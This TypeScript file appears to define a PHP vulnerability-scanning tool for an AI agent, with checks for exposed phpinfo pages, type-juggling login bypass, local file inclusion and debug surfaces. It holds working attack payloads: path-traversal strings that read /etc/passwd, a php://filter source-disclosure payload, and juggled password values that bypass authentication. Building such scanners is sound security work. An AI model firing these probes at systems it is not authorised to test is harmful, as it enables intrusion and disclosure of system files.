// php stack checks — ported from infra-security-mcp `providers/php`.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, summarize, type Check } from "./shared"

const DANGEROUS = ["exec", "system", "passthru", "shell_exec", "popen", "proc_open", "eval", "assert"]

export namespace Php {
  export async function detect(sender: HttpSender, origin: string): Promise<Check> {
    const res = await get(sender, origin)
    if (failed(res)) return { check: "detect", hit: false, severity: "info", detail: "no response" }
    const php = /PHP/i.test(header(res, "x-powered-by")) || /PHPSESSID/.test(header(res, "set-cookie"))
    if (!php) return { check: "detect", hit: false, severity: "info", detail: "PHP not detected" }
    return { check: "detect", hit: true, severity: "info", detail: "PHP detected", evidence: header(res, "x-powered-by") || "PHPSESSID" }
  }

  export async function infoExposure(sender: HttpSender, origin: string): Promise<Check> {
    const paths = ["/info.php", "/phpinfo.php", "/test.php", "/i.php", "/pi.php", "/php_info.php", "/_phpinfo.php"]
    for (const p of paths) {
      const res = await get(sender, `${origin}${p}`)
      if (failed(res)) continue
      if (res.status === 200 && /phpinfo\(\)|PHP Version/i.test(res.body)) {
        const ver = (res.body.match(/PHP Version ([\d.]+)/) || [])[1]
        const df = (res.body.match(/disable_functions<\/td>\s*<td[^>]*>([^<]*)/i) || [])[1]
        const still = DANGEROUS.filter((f) => !df || !df.includes(f))
        return { check: "info_exposure", hit: true, severity: "high", detail: `phpinfo() exposed at ${p}${ver ? ` (PHP ${ver})` : ""}${still.length ? ` — RCE fns available: ${still.join(",")}` : ""}`, evidence: res.body.slice(0, 150) }
      }
    }
    return { check: "info_exposure", hit: false, severity: "info", detail: "no exposed phpinfo()" }
  }

  export async function typeJuggle(sender: HttpSender, origin: string): Promise<Check> {
    const base0 = await sender.send({ method: "POST", url: `${origin}/login`, headers: { "Content-Type": "application/json" }, body: JSON.stringify({ password: "wrongvalue123" }) })
    if (failed(base0)) return { check: "type_juggle", hit: false, severity: "info", detail: "no /login JSON endpoint" }
    for (const v of [0, true, "0", null]) {
      const res = await sender.send({ method: "POST", url: `${origin}/login`, headers: { "Content-Type": "application/json" }, body: JSON.stringify({ password: v }) })
      if (ok(res) && res.status !== base0.status && res.status < 400)
        return { check: "type_juggle", hit: true, severity: "high", detail: `PHP type-juggling auth bypass with password=${JSON.stringify(v)}`, evidence: `baseline=${base0.status} juggled=${res.status}` }
    }
    return { check: "type_juggle", hit: false, severity: "info", detail: "no type-juggling auth bypass" }
  }

  export async function fileInclusion(sender: HttpSender, origin: string): Promise<Check> {
    const payloads = ["../../../../etc/passwd", "....//....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index", "..%2f..%2f..%2fetc%2fpasswd"]
    for (const param of ["file", "page", "path", "include", "template"])
      for (const pl of payloads) {
        const res = await get(sender, `${origin}/?${param}=${encodeURIComponent(pl)}`)
        if (failed(res)) continue
        if ((res.body.includes("root:") && res.body.includes("/bin/")) || /^[A-Za-z0-9+/]{40,}={0,2}$/m.test(res.body.trim().slice(0, 100)) && pl.includes("base64"))
          return { check: "file_inclusion", hit: true, severity: "critical", detail: `LFI via '${param}' with ${pl}`, evidence: res.body.slice(0, 120) }
      }
    return { check: "file_inclusion", hit: false, severity: "info", detail: "no LFI observed" }
  }

  export async function debugExposure(sender: HttpSender, origin: string): Promise<Check> {
    const probes: [string, RegExp, string][] = [
      ["/_profiler/", /Symfony Profiler/i, "Symfony Profiler"],
      ["/telescope", /Telescope|Laravel/i, "Laravel Telescope"],
      ["/_ignition/health-check", /ignition|healthy/i, "Laravel Ignition"],
    ]
    for (const [p, rx, name] of probes) {
      const res = await get(sender, `${origin}${p}`)
      if (ok(res) && res.status === 200 && rx.test(res.body))
        return { check: "debug_exposure", hit: true, severity: "high", detail: `${name} debug surface exposed at ${p}`, evidence: res.body.slice(0, 120) }
    }
    const xd = await get(sender, origin, { Cookie: "XDEBUG_SESSION=phpstorm" })
    if (ok(xd) && header(xd, "x-xdebug-profile-filename") !== "")
      return { check: "debug_exposure", hit: true, severity: "high", detail: "Xdebug remote profiling enabled", evidence: header(xd, "x-xdebug-profile-filename") }
    return { check: "debug_exposure", hit: false, severity: "info", detail: "no PHP debug surface exposed" }
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    detect,
    info_exposure: infoExposure,
    type_juggle: typeJuggle,
    file_inclusion: fileInclusion,
    debug_exposure: debugExposure,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `PHP checks (detection, phpinfo() exposure + disable_functions gap, type-juggling auth bypass, local file inclusion, Xdebug/Ignition/Whoops/Symfony-Profiler debug surfaces).

Run after Vortex fingerprints PHP. Probes go through the scope-guarded replay engine. check="all" (default) runs every check.`

export const PhpTestTool = defineWebhookTool({
  name: "php_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "detect", "info_exposure", "type_juggle", "file_inclusion", "debug_exposure"])
      .default("all")
      .describe("Which check to run; 'all' runs every PHP check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Php.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("php_test", r.target, r.results)
  },
})
